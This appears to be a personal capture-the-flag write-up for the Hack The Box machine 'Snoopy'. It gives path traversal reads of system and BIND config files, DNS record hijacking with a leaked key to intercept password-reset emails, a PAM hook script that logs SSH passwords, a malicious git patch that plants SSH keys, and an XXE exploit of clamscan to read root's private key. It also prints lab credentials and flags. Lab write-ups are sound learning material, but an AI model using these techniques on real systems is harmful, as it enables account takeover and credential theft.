# 10.129.57.220

## NMAP
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ee6bcec5b6e3fa1b97c03d5fe3f1a16e (ECDSA)
|_  256 545941e1719a1a879c1e995059bfe5ba (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: SnoopySec Bootstrap Template - Index
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- nmap missed the dns port 53 on first scan

## Foothold
- download page takes `file` parameter:
    - allows file path manipulation
- nginx/1.18.0 (UBUNTU)
- vhost enum found - `mm.snoopy.htb`
- `dig axfr snoopy.htb @10.129.57.220`
```
snoopy.htb.             86400   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
snoopy.htb.             86400   IN      NS      ns1.snoopy.htb.
snoopy.htb.             86400   IN      NS      ns2.snoopy.htb.
mattermost.snoopy.htb.  86400   IN      A       172.18.0.3
mm.snoopy.htb.          86400   IN      A       127.0.0.1
ns1.snoopy.htb.         86400   IN      A       10.0.50.10
ns2.snoopy.htb.         86400   IN      A       10.0.51.10
postgres.snoopy.htb.    86400   IN      A       172.18.0.2
provisions.snoopy.htb.  86400   IN      A       172.18.0.4
www.snoopy.htb.         86400   IN      A       127.0.0.1
snoopy.htb.             86400   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
```
- contact.html page says `mail.snoopy.htb` is offline.
- if we enter `/doesnotexist.php`, the app returns a different error than `/doesnotexist.html`. WE can assume that the download page is a php page
- **FILE PATH MANIPULATION**
    - `....//....//....//....//etc/passwd` returns a zip file with the contents
    - created a python script to go through the files
    - `./unzipper.py /proc/self/cwd/download.php`
    - `for i in $(seq 0 100); do ./unzipper.py /proc/$i/cmdline; done`
        - yeilds nothing
    - `./unzipper.py /etc/nginx/sites-enabled/default`
    - `./unzipper.py /etc/bind/named.conf`
        - contains the secret key
        ```
        key "rndc-key" {
            algorithm hmac-sha256;
            secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
        };
        ```
    - `./unzipper.py /etc/bind/named.conf.options`
        - shows allow-transfer enabled
    - `./unzipper.py /etc/bind/named.conf.local`
        ```
        zone "snoopy.htb" IN {
            type master;
            file "/var/lib/bind/db.snoopy.htb";
            allow-update { key "rndc-key"; };
            allow-transfer { 10.0.0.0/8; };
        };
        ```
        - we can dump the db.snoopy.htb to get the afxr records
        - `allow-update` key is the interesting find

- the mattermost instance had a forgot password functionality that might use `mail.snoopy.htb`
**Redirecting DNS Zone to our KALI**
- `dig axfr @10.129.57.220 snoopy.htb -y hmac-sha256:rndc-key:BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=`
    - dont need to do this as we already could
    - note that mail.snoopy.htb is not present so we can directly add instead of deleting
- updating the dns record using nsupdate
```
nsupdate -y hmac-sha256:rndc-key:BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=
> server 10.129.57.220
> zone snoopy.htb
> update delete dev.domain.htb IN A - not needed
> update add mail.snoopy.htb 60 IN A 10.10.14.246
> show
> send
> quit
```
- can also save the key to a file and the above commands to another and run:
    - `nsupdate -k rndc-key nsupdater.txt`
- check if this worked
    - `dig mail.snoopy.htb @10.129.57.220 ANY +noall +answer`
    - shows mail.snoopy.htb pointing to our kali ip
- on kali start an smtp server (nc wont work as the target might require a HELO to start the connection)
    - `sudo python3 -m aiosmtpd -n -l 0.0.0.0:25 -d`
- confirm if the dig is still working
- go to mm.snoopy.htb and send a reset link for cbrown@snoopy.htb
    - we will get a password reset link in the python3 aiosmtpd terminal
    - the output has token=`3d` and another `=` before a new line. Remove these and use the URL to reset the password
- crbown:Passer@123
- schultz:Passer@123
- log in as cbrown to see the chats. there is a server-provisioning channel that will provision servers
- `/server_provision` and enter kali ip. start nc before sending this.
    - we see a connection back as `SSH-2.0-paramiko_3.1.0`

#### Setting up a PAM server to capture authentication
- locate `pam_exec.so`
    - `/usr/lib/x86_64-linux-gnu/security/pam_exec.so` 
- update `/etc/pam.d/common-auth`
    - add the following line
    - `auth optional    pam_exec.so quiet expose_authtok /dev/shm/pwn.sh`
    - ![alt text](image-2.png)
- add `/dev/shm/pwn.sh`
    ```
    #!/bin/sh
    echo "$(date) - $PAM_USER:$(cat -)" >> /dev/shm/pwned.log 
    ```
- `sudo chmod +x /dev/shm/pwn.sh`
- `sudo service ssh restart`
- confirm with `ssh localhost`, enter a wrong password and note that the pwned.log file contains details.
- now, the `server_provision` automation is looking for port 2222.
- `socat TCP-LISTEN:2222,fork,reuseaddr TCP:127.0.0.1:22`
    - will redirect from 2222 to 22.
    - instead of changing complete ssh config. this is easier.
- run the `server_provision` on Mattermost.
- checking the pwned.log, we see a request for `cbrown` but since our machine does not have cbrown, the password is not asked and hence not logged.
- `sudo useradd cbrown` and run the `server_provision` script again.
- `cat pwned.log` shows - `Fri Jan  9 14:23:40 EST 2026 - cbrown:sn00pedcr3dential!!!`
- using ssh with `cbrown:sn00pedcr3dential!!!`
- **REMOVE THE ABOVE CHANGES**

#### Getting shell as sbrown
- `sudo -l`
    - `(sbrown) PASSWD: /usr/bin/git ^apply -v [a-zA-Z0-9.]+$`
- run `ssh-keygen` in cbrown and add the public key to `authorized_keys` in cbrown
- create a `/tmp/exploit.patch` with below contents
```
--- /dev/null
+++ /home/sbrown/.ssh/authorized_keys
@@ -0,0 +1,1 @@
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCo3QDwvD1a+F6puld6s2dmhJpiB1BywPESVARlwpw0+TgwKtTaJWWevxZ/JdAxm6GQd7r/GfN1MVj5gqCGR+EZJxnVnEND67acMZAWTov7qb6JLNkjdpYC/Wab7PxznPFXrRzKwaMmf01Z2R+ZzQxNbUNL+WdzYBm6QVqcxRzUYJH5KIV1e0/xgobZxefWnmUSNr1Usw02orD6PJbH6udeZ5QCih7UjN+7FcHYwSAXsEOKzd0frJ3xayaIeTjeg2L75xtgrZSFsnJ8OQIcU4wngbIZbsaDqA49r/TfJqvW/orstEBSynsKKJR6tp+yg4vi744hdhqsb/R0okcktuix7d78ubsxzmk5ukrVaSaxMF+hedu6ID3xRrYBLz5NbSRXJG+O1ZedrIQj55f9JzOoOOEeM3RurfAK9CFafFKRm5ZZ6clx8aqVVrQRPVvyKQac9mRhx7p4pAeq9EdOFGZrX7JNtkM/bIkZYXDGIkxDhtIODFoxFPKyuPIMuzMAnDs= sbrown@snoopy.htb
```
- `sudo -u sbrown /usr/bin/git apply -v exploit.patch`
- `ssh -i cbrown_id_rsa sbrown@snoopy.htb`
- above did not work so used this - https://0xdf.gitlab.io/2023/09/23/htb-snoopy.html

- then `ssh -i chbrown_id_rsa sbrown@snoopy.htb`
- we get user.txt - 1b8b200deaecb414acc5ea01974a3405

## PrivEsc
- sbrown can run clamscan as root without password
- exploiting cve-2023-20052
- get a dmg file - https://macdownload.informer.com/notepad/9.9/
- add an xxe payload to read `file:///root/.ssh/id_rsa`
- https://0xdf.gitlab.io/2023/09/23/htb-snoopy.html
- `sudo clamscan --debug scanfiles/notepad.dmg`
- the output will have the private key.
- copy, clean, chmod
- ssh root_id_rsa to get root.txt - 72cfd955aee7885d02ee5877837a9c8c
